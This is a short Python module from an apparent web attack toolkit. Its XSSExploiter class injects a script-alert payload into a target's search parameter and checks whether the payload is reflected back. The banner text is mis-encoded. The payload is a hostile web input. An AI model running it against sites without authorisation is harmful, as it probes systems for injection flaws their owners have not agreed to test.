# modules/exploits/xss_exploit.py
from core.scanner_base import ScannerBase

class XSSExploiter(ScannerBase):
    def __init__(self, url):
        super().__init__(url)
        
    def exploit(self):
        print("""
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘    ğŸš¨ XSS EXPLOITER ğŸš¨     â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
        print(f"[*] Attempting XSS exploit on {self.target}")
        
        payload = "<script>alert('KasauSec XSS Exploit')</script>"
        test_url = f"{self.target}/search?q={payload}"
        
        try:
            resp = self._send_request(test_url)
            if resp and payload in resp.text:
                print("[+] XSS Exploit successful! Payload executed in response")
                return True
            else:
                print("[!] XSS Exploit failed - payload not reflected")
                return False
        except Exception as e:
            print(f"[!] Exploit failed: {str(e)}")
            return False
